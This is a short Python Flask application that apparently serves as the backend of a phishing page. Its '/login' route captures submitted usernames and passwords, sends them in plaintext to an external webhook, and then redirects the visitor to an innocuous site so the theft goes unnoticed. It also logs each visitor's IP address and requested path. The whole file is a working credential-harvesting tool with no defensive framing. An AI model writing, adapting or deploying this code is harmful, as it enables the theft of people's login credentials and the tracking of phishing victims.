import logging
from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='request.log', level=logging.INFO)

webhook_url = "<url>"
redirect_url = "https://www.example.com"

@app.route('/info')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Get the form data
    username = request.form.get('uname')
    password = request.form.get('psw')

    # Prepare the data to send
    data = {
        'username': username,
        'password': password
    }

    # Send the data as a POST request to the webhook URL
    response = requests.post(webhook_url, json=data)

    if response.status_code == 200:
        return redirect(redirect_url)
    else:
        return 'Login failed!'

# Log every request
@app.after_request
def log_request(response):
    logger = logging.getLogger('werkzeug')
    logger.info('%s %s %s %s %s', request.remote_addr, request.method, request.scheme,
                request.full_path, response.status)
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
